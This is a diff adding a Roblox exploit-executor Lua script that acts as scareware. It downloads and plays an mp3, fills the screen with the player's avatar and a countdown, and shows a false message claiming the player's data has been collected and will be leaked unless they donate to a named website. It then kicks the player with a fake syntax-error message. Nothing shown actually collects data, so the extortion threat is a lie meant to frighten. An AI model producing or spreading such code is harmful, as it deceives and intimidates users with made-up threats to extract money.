@@ -1,0 +1,172 @@
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+
+local player = Players.LocalPlayer
+local LOCAL_NAME = "a.mp3"
+local MP3_URL = "https://github.com/not-gato/Stuff/raw/refs/heads/main/Files/a3e6e16a2794160b73418f151043202c.mp3"
+local TOTAL_COUNT = 30
+local TOTAL_TIME = 25
+
+if writefile then
+    local body
+    if syn and syn.request then
+        local ok,res = pcall(function() return syn.request({Url = MP3_URL, Method = "GET"}).Body end)
+        if ok then body = res end
+    elseif http_request then
+        local ok,res = pcall(function() return http_request({Url = MP3_URL, Method = "GET"}).Body end)
+        if ok then body = res end
+    end
+    if body then
+        pcall(function() writefile(LOCAL_NAME, body) end)
+    end
+end
+
+local sound
+local function playAudio()
+    sound = Instance.new("Sound")
+    sound.SoundId = getcustomasset(LOCAL_NAME)
+    sound.Volume = 1
+    sound.Parent = Workspace
+    sound:Play()
+end
+
+local function buildGUI()
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "CountdownGui"
+    screen.ResetOnSpawn = false
+    if screen.IgnoreGuiInset ~= nil then screen.IgnoreGuiInset = true end
+    screen.Parent = CoreGui
+
+    local whiteFrame = Instance.new("Frame")
+    whiteFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    whiteFrame.Size = UDim2.new(1,0,1,0)
+    whiteFrame.BorderSizePixel = 0
+    whiteFrame.Parent = screen
+
+    local textFrame = Instance.new("Frame")
+    textFrame.Size = UDim2.new(0.5,0,0.7,0)
+    textFrame.Position = UDim2.new(0,0,0.15,0)
+    textFrame.BackgroundTransparency = 1
+    textFrame.Parent = whiteFrame
+
+    local text1 = Instance.new("TextLabel")
+    text1.Size = UDim2.new(1,0,0.3,0)
+    text1.Position = UDim2.new(0,0,0,0)
+    text1.BackgroundTransparency = 1
+    text1.TextColor3 = Color3.fromRGB(0,0,0)
+    text1.Font = Enum.Font.SourceSansBold
+    text1.TextScaled = true
+    text1.Text = "Thanks For Playing"
+    text1.TextXAlignment = Enum.TextXAlignment.Left
+    text1.Parent = textFrame
+
+    local text2 = Instance.new("TextLabel")
+    text2.Size = UDim2.new(1,0,0.7,0)
+    text2.Position = UDim2.new(0,0,0.3,0)
+    text2.BackgroundTransparency = 1
+    text2.TextColor3 = Color3.fromRGB(0,0,0)
+    text2.Font = Enum.Font.SourceSansBold
+    text2.TextScaled = true
+    text2.TextWrapped = true
+    text2.TextXAlignment = Enum.TextXAlignment.Left
+    text2.Text = "But as you know, you have been using a cheat utility to help u win games, all of your data have been collected, if you dont donate to http://FOGISCOMING.net/ all of your data is gonna get leaked"
+    text2.Parent = textFrame
+
+    local playerImage = Instance.new("ImageLabel")
+    playerImage.Size = UDim2.new(0.25,0,0.4,0)
+    playerImage.Position = UDim2.new(0.75,0,0.3,0)
+    playerImage.BackgroundTransparency = 1
+    playerImage.Image = "rbxthumb://type=AvatarHeadShot&id="..player.UserId.."&w=150&h=150"
+    playerImage.Parent = whiteFrame
+
+    local blackFrame = Instance.new("Frame")
+    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    blackFrame.Size = UDim2.new(0.3,0,0.1,0)
+    blackFrame.Position = UDim2.new(0,0,0.85,0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.Parent = whiteFrame
+
+    local countdownLabel = Instance.new("TextLabel")
+    countdownLabel.Size = UDim2.new(1,0,1,0)
+    countdownLabel.Position = UDim2.new(0,0,0,0)
+    countdownLabel.BackgroundTransparency = 1
+    countdownLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    countdownLabel.Font = Enum.Font.SourceSansBold
+    countdownLabel.TextScaled = true
+    countdownLabel.Text = ":30"
+    countdownLabel.TextXAlignment = Enum.TextXAlignment.Left
+    countdownLabel.Parent = blackFrame
+
+    return countdownLabel
+end
+
+local originalPositions = {}
+local function storeOriginalPositions(gui)
+    for _, obj in pairs(gui:GetDescendants()) do
+        if obj:IsA("GuiObject") then
+            originalPositions[obj] = obj.Position
+        end
+    end
+end
+
+local function shakeGUI(magnitude)
+    local screenX = Workspace.CurrentCamera.ViewportSize.X
+    local screenY = Workspace.CurrentCamera.ViewportSize.Y
+    for obj, origPos in pairs(originalPositions) do
+        local objAbs = obj.AbsoluteSize
+        local maxXOffset = math.min(magnitude*objAbs.X, screenX - objAbs.X - origPos.X.Offset)
+        local maxYOffset = math.min(magnitude*objAbs.Y, screenY - objAbs.Y - origPos.Y.Offset)
+        local minXOffset = -origPos.X.Offset
+        local minYOffset = -origPos.Y.Offset
+        local xOffset = math.random()*(maxXOffset - minXOffset) + minXOffset
+        local yOffset = math.random()*(maxYOffset - minYOffset) + minYOffset
+        pcall(function()
+            obj.Position = UDim2.new(origPos.X.Scale, origPos.X.Offset + xOffset,
+                                     origPos.Y.Scale, origPos.Y.Offset + yOffset)
+        end)
+    end
+end
+
+playAudio()
+local label = buildGUI()
+
+local guisToShake = {CoreGui, player:FindFirstChild("PlayerGui")}
+for _, g in pairs(Workspace:GetChildren()) do
+    if g.Name == "Hui" and g:IsA("ScreenGui") then
+        table.insert(guisToShake, g)
+    end
+end
+for _, gui in pairs(guisToShake) do
+    if gui then storeOriginalPositions(gui) end
+end
+
+local timeLeft = TOTAL_COUNT
+local baseInterval = TOTAL_TIME / TOTAL_COUNT
+local speedMultiplier = 1.02
+local shakeMagnitude = 0.002
+local shakeMultiplier = 1.01
+local accumulatedTime = 0
+
+local conn
+conn = RunService.RenderStepped:Connect(function(deltaTime)
+    accumulatedTime = accumulatedTime + deltaTime
+    if accumulatedTime >= baseInterval then
+        timeLeft = timeLeft - 1
+        if timeLeft < 0 then timeLeft = 0 end
+        pcall(function() label.Text = string.format(":%d", timeLeft) end)
+        baseInterval = baseInterval / speedMultiplier
+        if baseInterval < 0.01 then baseInterval = 0.01 end
+        accumulatedTime = 0
+    end
+    shakeMagnitude = shakeMagnitude * shakeMultiplier
+    shakeGUI(shakeMagnitude)
+    if timeLeft <= 0 then
+        conn:Disconnect()
+        if sound then pcall(function() sound:Destroy() end) end
+        pcall(function()
+            player:Kick('[\"string\"]:49: Expected \'{\' got \'(\'')
+        end)
+    end
+end)
